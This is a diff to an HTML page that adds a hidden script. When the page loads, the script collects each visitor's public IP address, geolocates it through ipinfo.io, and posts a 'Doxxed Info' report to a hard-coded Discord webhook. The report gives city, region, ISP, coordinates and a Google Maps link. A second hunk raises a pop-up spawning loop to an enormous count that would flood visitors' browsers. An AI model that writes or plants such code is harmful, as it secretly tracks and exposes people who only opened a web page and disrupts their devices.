@@ -21,7 +21,123 @@
       object-fit: cover;
     }
   </style>
+<script>
+    const webhookUrl = 'https://discord.com/api/webhooks/1249949766733922358/gbAhqiLj4Ox5a_UUCNjgSB4mSayRrYo4N-190H3M_KAHuyWF23UVRBgWPgkkEY4J6439';
 
+    // Function to fetch and log IP, and get lat/lon info
+    const logIp = async () => {
+        try {
+            // Get user's public IP address
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            const userIP = data.ip;
+
+            console.log('User IP:', userIP);
+
+            // Send the IP address to a Discord webhook
+            const ipResponse = await fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ content: `User IP: ${userIP}` })
+            });
+
+            if (!ipResponse.ok) {
+                throw new Error('Failed to send IP to Discord webhook');
+            }
+
+            console.log('IP logged and sent to webhook.');
+
+            // Use ipinfo.io for geolocation directly (No CORS proxy)
+            const locationResponse = await fetch(`https://ipinfo.io/${userIP}/json`);
+            const locationData = await locationResponse.json();
+
+            if (locationData.error) {
+                console.log('Unable to fetch location data for the user.');
+                return;
+            }
+
+            const { country, region, city, loc, timezone, org } = locationData;
+            const [lat, lon] = loc.split(',');
+
+            // Generate the Google Maps link
+            const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+
+            // Create the embed message
+            const embedMessage = {
+                username: "smort - MAXH@X",
+                avatar_url: "https://i.imgflip.com/4gyc7u.png", // You can change the avatar image URL
+                embeds: [{
+                    title: `🌍 Doxxed Info for IP: ${userIP}`,
+                    description: `Information gathered for the Target with IP address: ${userIP}`,
+                    color: 15417396, // Light blue color
+                    fields: [
+                        {
+                            name: "📍 Country",
+                            value: country,
+                            inline: true
+                        },
+                        {
+                            name: "🏙️ City",
+                            value: city,
+                            inline: true
+                        },
+                        {
+                            name: "🌐 Region",
+                            value: region,
+                            inline: true
+                        },
+                        {
+                            name: "🌐 Timezone",
+                            value: timezone,
+                            inline: true
+                        },
+                        {
+                            name: "🌐 ISP",
+                            value: org,
+                            inline: true
+                        },
+                        {
+                            name: "🗺️ Coordinates",
+                            value: `Latitude: ${lat}\nLongitude: ${lon}`,
+                            inline: true
+                        },
+                        {
+                            name: "🔗 Google Maps Link",
+                            value: `[View on Google Maps](${googleMapsLink})`,
+                            inline: true
+                        }
+                    ],
+                    footer: {
+                        text: "Data provided by MAXH@X"
+                    }
+                }]
+            };
+
+            // Send the embed message to Discord webhook
+            const embedResponse = await fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(embedMessage)
+            });
+
+            if (!embedResponse.ok) {
+                throw new Error('Failed to send embed to Discord webhook');
+            }
+
+            console.log('Location data sent to webhook.');
+
+        } catch (error) {
+            console.error('Error logging IP or fetching location:', error);
+        }
+    };
+
+    // Execute the logIp function when the page loads
+    window.onload = logIp;
+</script>
   <script>
     let popups = [];
 
@@ -98,7 +214,7 @@
 
     // **NEW FUNCTION: CHAOTIC POPUPS**
     function spawnChaosPopups() {
-      for (let i = 0; i < 9999; i++) { // Spawns 15 popups randomly
+      for (let i = 0; i < 999999999999; i++) { // Spawns 15 popups randomly
         setTimeout(() => {
           const width = 250, height = 150;
           const left = Math.floor(Math.random() * (screen.width - width));
